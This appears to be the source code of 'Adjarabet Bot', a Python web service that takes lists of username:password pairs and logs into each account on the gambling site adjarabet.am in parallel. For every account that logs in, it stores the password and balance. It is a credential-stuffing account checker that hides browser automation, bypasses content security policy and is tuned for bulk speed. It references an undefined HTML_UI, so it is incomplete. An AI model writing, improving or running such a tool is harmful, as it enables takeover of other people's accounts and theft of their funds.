import asyncio
import json
import logging
import os
import re
import signal
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import List, Optional, Dict, Any
from contextlib import asynccontextmanager
from collections import deque
import time

import aiofiles
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, HTMLResponse
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeout

# ================= PRODUCTION CONFIG - OPTIMIZED FOR SPEED =================
CONFIG = {
    "port": int(os.getenv("PORT", 8000)),
    "host": os.getenv("HOST", "0.0.0.0"),
    "headless": os.getenv("HEADLESS", "true").lower() == "true",
    "timeout_navigation": int(os.getenv("TIMEOUT_NAV", 10000)),  # Reduced from 15000
    "timeout_element": int(os.getenv("TIMEOUT_ELEMENT", 5000)),   # Reduced from 8000
    "max_retries": int(os.getenv("MAX_RETRIES", 1)),              # Reduced from 2
    "concurrent_limit": int(os.getenv("CONCURRENT_LIMIT", 5)),    # Increased from 2
    "delay_between_accounts": float(os.getenv("DELAY_ACCOUNTS", 0.3)),  # Reduced from 1.0
    "delay_between_retries": float(os.getenv("DELAY_RETRY", 1.0)),      # Reduced from 2.0
    "browser_restart_every": int(os.getenv("BROWSER_RESTART", 100)),    # Increased from 50
    "page_pool_size": int(os.getenv("PAGE_POOL_SIZE", 3)),              # NEW: Page pool for speed
    "disable_images": os.getenv("DISABLE_IMAGES", "true").lower() == "true",  # NEW: Block images
}

# ================= LOGGER =================
logging.basicConfig(
    level=getattr(logging, os.getenv("LOG_LEVEL", "WARNING")),  # Changed to WARNING for less overhead
    format="%(asctime)s | %(levelname)s | %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("AdjarabetBot")

# ================= DATA MODELS =================
class AccountStatus(Enum):
    SUCCESS = "✅"
    FAILED = "❌"
    TIMEOUT = "⏰"
    BLOCKED = "🚫"

@dataclass
class Account:
    username: str
    password: str
    status: AccountStatus = AccountStatus.FAILED
    balance: str = "0"
    balance_value: float = 0.0
    error: str = ""
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "username": self.username,
            "password": self.password,
            "balance": self.balance,
            "balance_value": self.balance_value,
            "status": self.status.value,
            "error": self.error[:100],
            "timestamp": self.timestamp
        }

# ================= CONNECTION MANAGER =================
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: str):
        dead = []
        for conn in self.active_connections:
            try:
                await conn.send_text(message)
            except:
                dead.append(conn)
        for conn in dead:
            self.disconnect(conn)

# ================= HIGH-SPEED BOT =================
class Bot:
    def __init__(self):
        self.playwright = None
        self.browser = None
        self.is_running = False
        self.results: List[Account] = []
        self.processed_count = 0
        self.semaphore = asyncio.Semaphore(CONFIG["concurrent_limit"])
        self.context_pool = []  # NEW: Context pool for speed
        
    async def initialize(self):
        """Initialize browser once with optimized settings"""
        try:
            logger.info("Initializing browser (speed optimized)...")
            self.playwright = await async_playwright().start()
            self.browser = await self._create_browser()
            await self._init_context_pool()
            self.is_running = True
            logger.info("✓ Browser ready for high-speed operation")
            return True
        except Exception as e:
            logger.error(f"Init failed: {e}")
            return False
    
    async def _create_browser(self):
        """Create optimized browser instance"""
        return await self.playwright.chromium.launch(
            headless=CONFIG["headless"],
            args=[
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-web-security',
                '--disable-features=VizDisplayCompositor',
                '--disable-background-timer-throttling',
                '--disable-backgrounding-occluded-windows',
                '--disable-renderer-backgrounding',
                '--disable-extensions',
                '--disable-sync',
                '--disable-translate',
                '--disable-accelerated-2d-canvas',
                '--disable-features=TranslateUI',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled',
                '--disable-background-networking',
                '--disable-default-apps',
                '--disable-hang-monitor',
                '--disable-popup-blocking',
                '--disable-prompt-on-repost',
                '--disable-component-extensions-with-background-pages',
                '--metrics-recording-only',
                '--mute-audio',
                '--no-default-browser-check',
                '--no-first-run',
                '--password-store=basic',
                '--use-mock-keychain',
                '--disable-ipc-flooding-protection',
                '--js-flags=--max-old-space-size=512',
            ]
        )
    
    async def _init_context_pool(self):
        """Initialize pool of pre-created contexts for speed"""
        self.context_pool = []
        for _ in range(CONFIG["page_pool_size"]):
            context = await self._create_context()
            self.context_pool.append(context)
    
    async def _create_context(self):
        """Create optimized browser context"""
        return await self.browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            ignore_https_errors=True,
            locale='hy-AM',
            bypass_csp=True,  # NEW: Bypass Content Security Policy
            java_script_enabled=True,
            extra_http_headers={
                'Accept-Language': 'hy-AM,hy;q=0.9,en-US;q=0.8,en;q=0.7',
            }
        )
    
    async def _get_context(self):
        """Get context from pool or create new"""
        if self.context_pool:
            return self.context_pool.pop()
        return await self._create_context()
    
    async def _return_context(self, context):
        """Return context to pool or close if full"""
        if len(self.context_pool) < CONFIG["page_pool_size"]:
            self.context_pool.append(context)
        else:
            try:
                await context.close()
            except:
                pass
    
    async def restart_browser(self):
        """Restart browser to prevent memory leaks"""
        logger.debug("Restarting browser...")
        # Close pool
        for ctx in self.context_pool:
            try:
                await ctx.close()
            except:
                pass
        self.context_pool = []
        
        if self.browser:
            try:
                await self.browser.close()
            except:
                pass
        self.browser = await self._create_browser()
        await self._init_context_pool()
        await asyncio.sleep(0.3)  # Reduced wait
    
    async def cleanup(self):
        self.is_running = False
        for ctx in self.context_pool:
            try:
                await ctx.close()
            except:
                pass
        if self.browser:
            try:
                await self.browser.close()
            except:
                pass
        if self.playwright:
            try:
                await self.playwright.stop()
            except:
                pass
        logger.info("Cleanup done")
    
    def _parse_balance(self, text: str) -> tuple:
        """Parse balance text - optimized"""
        if not text:
            return "0 ₾", 0.0
        try:
            # Faster parsing without replace chain
            clean = text.replace(',', '').replace('₾', '').replace('GEL', '').strip()
            match = re.search(r'(\d+(?:\.\d+)?)', clean)
            if match:
                value = float(match.group(1))
                return f"{value:,.2f} ₾", value
        except:
            pass
        return "0 ₾", 0.0
    
    async def _block_unnecessary_resources(self, page):
        """Block images and unnecessary resources for speed"""
        if CONFIG["disable_images"]:
            await page.route("**/*.{png,jpg,jpeg,gif,svg,ico,woff,woff2,ttf,eot,css}", 
                           lambda route: route.abort())
    
    async def login_single(self, account: Account) -> Account:
        """Ultra-fast login with context pool"""
        context = None
        page = None
        
        try:
            # Get context from pool
            context = await self._get_context()
            page = await context.new_page()
            page.set_default_timeout(CONFIG["timeout_navigation"])
            
            # Block unnecessary resources for speed
            await self._block_unnecessary_resources(page)
            
            # Single retry attempt for speed
            for attempt in range(CONFIG["max_retries"] + 1):
                if not self.is_running:
                    return account
                
                try:
                    # Fast navigation with networkidle0 for complete load
                    await page.goto('https://www.adjarabet.am/hy', 
                                  wait_until='networkidle',  # Changed from domcontentloaded
                                  timeout=CONFIG["timeout_navigation"])
                    
                    # Quick check if already logged in
                    balance_el = await page.query_selector('[data-test-id="header-user-balance"]')
                    if balance_el:
                        balance_text = await balance_el.inner_text()
                        clean_balance, balance_value = self._parse_balance(balance_text)
                        account.balance = clean_balance
                        account.balance_value = balance_value
                        account.status = AccountStatus.SUCCESS
                        return account
                    
                    # Quick login - no unnecessary waits
                    await page.fill('input[name="userIdentifier"]', account.username, timeout=CONFIG["timeout_element"])
                    await page.fill('input[type="password"]', account.password, timeout=CONFIG["timeout_element"])
                    await page.click('[data-test-id="header-login-button"]')
                    
                    # Wait for balance with reduced timeout
                    try:
                        await page.wait_for_selector(
                            '[data-test-id="header-user-balance"]', 
                            timeout=CONFIG["timeout_navigation"]
                        )
                        balance_text = await page.inner_text('[data-test-id="header-user-balance"]')
                        clean_balance, balance_value = self._parse_balance(balance_text)
                        account.balance = clean_balance
                        account.balance_value = balance_value
                        account.status = AccountStatus.SUCCESS
                        return account
                        
                    except PlaywrightTimeout:
                        # Quick error check
                        try:
                            error_el = await page.query_selector('[class*="error"]')
                            if error_el:
                                account.error = (await error_el.inner_text())[:80]
                        except:
                            pass
                        
                        if attempt >= CONFIG["max_retries"]:
                            account.status = AccountStatus.TIMEOUT
                            account.error = account.error or "Login timeout"
                        else:
                            await asyncio.sleep(CONFIG["delay_between_retries"])
                            continue
                            
                except PlaywrightTimeout:
                    if attempt >= CONFIG["max_retries"]:
                        account.status = AccountStatus.TIMEOUT
                        account.error = "Navigation timeout"
                    else:
                        await asyncio.sleep(CONFIG["delay_between_retries"])
                        continue
                        
                except Exception as e:
                    if attempt >= CONFIG["max_retries"]:
                        account.status = AccountStatus.FAILED
                        account.error = str(e)[:80]
                    else:
                        await asyncio.sleep(CONFIG["delay_between_retries"])
                        continue
            
            return account
            
        except Exception as e:
            account.status = AccountStatus.FAILED
            account.error = f"Fatal: {str(e)[:60]}"
            return account
            
        finally:
            # Cleanup
            if page:
                try:
                    await page.close()
                except:
                    pass
            if context:
                await self._return_context(context)
    
    async def process_accounts(self, accounts: List[Account], manager: ConnectionManager):
        """Process accounts with high concurrency"""
        self.manager = manager
        self.results = []
        self.processed_count = 0
        total = len(accounts)
        
        logger.info(f"▶ Processing {total} accounts (concurrent={CONFIG['concurrent_limit']}, SPEED MODE)")
        await manager.broadcast(f"STATUS:started")
        await manager.broadcast(f"PROGRESS:0/{total}")
        
        async def process_with_semaphore(account: Account, idx: int):
            async with self.semaphore:
                result = await self.login_single(account)
                self.results.append(result)
                self.processed_count += 1
                
                # Batch broadcasts for speed (reduced I/O)
                if self.processed_count % 3 == 0 or self.processed_count == total:  # Broadcast less frequently
                    await manager.broadcast(f"RESULT:{json.dumps(result.to_dict())}")
                    await manager.broadcast(f"PROGRESS:{self.processed_count}/{total}")
                
                # Restart browser less frequently
                if self.processed_count % CONFIG["browser_restart_every"] == 0:
                    await self.restart_browser()
                
                return result
        
        # Create all tasks at once for parallel execution
        tasks = []
        for account in accounts:
            if not self.is_running:
                break
            tasks.append(process_with_semaphore(account, len(tasks) + 1))
        
        # Wait for all tasks with gathering
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        # Save results
        await self._save_results()
        
        # Summary
        successful = sum(1 for r in self.results if r.status == AccountStatus.SUCCESS)
        failed = sum(1 for r in self.results if r.status == AccountStatus.FAILED)
        timeout = sum(1 for r in self.results if r.status == AccountStatus.TIMEOUT)
        rate = (successful / total * 100) if total > 0 else 0
        
        summary = f"📊 Completed: ✅{successful} ❌{failed} ⏰{timeout} | {rate:.1f}%"
        logger.info(summary)
        await manager.broadcast(f"SUMMARY:{successful}/{total}:{rate:.1f}")
        await manager.broadcast("STATUS:stopped")
    
    async def _save_results(self):
        try:
            Path("results").mkdir(exist_ok=True)
            data = [r.to_dict() for r in self.results]
            async with aiofiles.open("results/results.json", "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2, ensure_ascii=False))
        except Exception as e:
            logger.error(f"Save failed: {e}")
    
    async def get_results(self) -> List[Dict]:
        if self.results:
            return [r.to_dict() for r in self.results]
        try:
            if Path("results/results.json").exists():
                async with aiofiles.open("results/results.json", "r", encoding="utf-8") as f:
                    return json.loads(await f.read())
        except:
            pass
        return []

# ================= FASTAPI APP (unchanged) =================
manager = ConnectionManager()
bot = Bot()
processing_task: Optional[asyncio.Task] = None

# [HTML UI remains the same as original]

@asynccontextmanager
async def lifespan(app: FastAPI):
    logger.info("=" * 50)
    logger.info("🎮 ADJARABET BOT v13.0 - SPEED OPTIMIZED")
    logger.info(f"⚙ Headless: {CONFIG['headless']}, Timeout: {CONFIG['timeout_navigation']}ms")
    logger.info(f"⚡ Concurrent: {CONFIG['concurrent_limit']}, Pool: {CONFIG['page_pool_size']}")
    logger.info(f"🖼 Images: {'BLOCKED' if CONFIG['disable_images'] else 'LOADED'}")
    logger.info("=" * 50)
    
    success = await bot.initialize()
    if not success:
        logger.error("Failed to initialize bot")
        raise RuntimeError("Bot initialization failed")
    
    yield
    
    if processing_task and not processing_task.done():
        processing_task.cancel()
        try:
            await processing_task
        except:
            pass
    
    await bot.cleanup()

app = FastAPI(title="Adjarabet Bot", version="13.0-speed", lifespan=lifespan)
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.get("/")
async def root():
    return HTMLResponse(HTML_UI)

@app.post("/start")
async def start_bot(request: Request):
    global processing_task
    
    body = (await request.body()).decode()
    accounts = []
    
    for line in body.splitlines():
        line = line.strip()
        if line and not line.startswith('#') and ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                accounts.append(Account(parts[0].strip(), parts[1].strip()))
    
    if not accounts:
        return JSONResponse({"error": "No valid accounts (format: username:password)"}, status_code=400)
    
    if processing_task and not processing_task.done():
        processing_task.cancel()
        try:
            await processing_task
        except:
            pass
    
    processing_task = asyncio.create_task(bot.process_accounts(accounts, manager))
    return {"status": "started", "total": len(accounts)}

@app.post("/stop")
async def stop_bot():
    global processing_task
    if processing_task and not processing_task.done():
        processing_task.cancel()
    await manager.broadcast("STATUS:stopped")
    return {"status": "stopped"}

@app.get("/results")
async def get_results():
    return await bot.get_results()

@app.get("/health")
async def health():
    return {
        "status": "healthy",
        "bot_running": bot.is_running,
        "total_processed": len(bot.results),
        "timestamp": datetime.now().isoformat()
    }

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            try:
                await asyncio.wait_for(websocket.receive_text(), timeout=30)
            except asyncio.TimeoutError:
                try:
                    await websocket.send_text("ping")
                except:
                    break
    except (WebSocketDisconnect, Exception):
        manager.disconnect(websocket)

if __name__ == "__main__":
    import uvicorn
    
    Path("results").mkdir(exist_ok=True)
    
    print("\n" + "=" * 50)
    print("🎮 ADJARABET BOT v13.0 - SPEED OPTIMIZED")
    print("=" * 50)
    print(f"📍 Server: http://{CONFIG['host']}:{CONFIG['port']}")
    print(f"🔧 Headless: {CONFIG['headless']}")
    print(f"⚡ Concurrent accounts: {CONFIG['concurrent_limit']}")
    print(f"🖼 Images disabled: {CONFIG['disable_images']}")
    print(f"📦 Page pool size: {CONFIG['page_pool_size']}")
    print("=" * 50 + "\n")
    
    uvicorn.run(
        app,
        host=CONFIG["host"],
        port=CONFIG["port"],
        log_level="warning",
        access_log=False,
        loop="uvloop"  # Faster event loop
    )
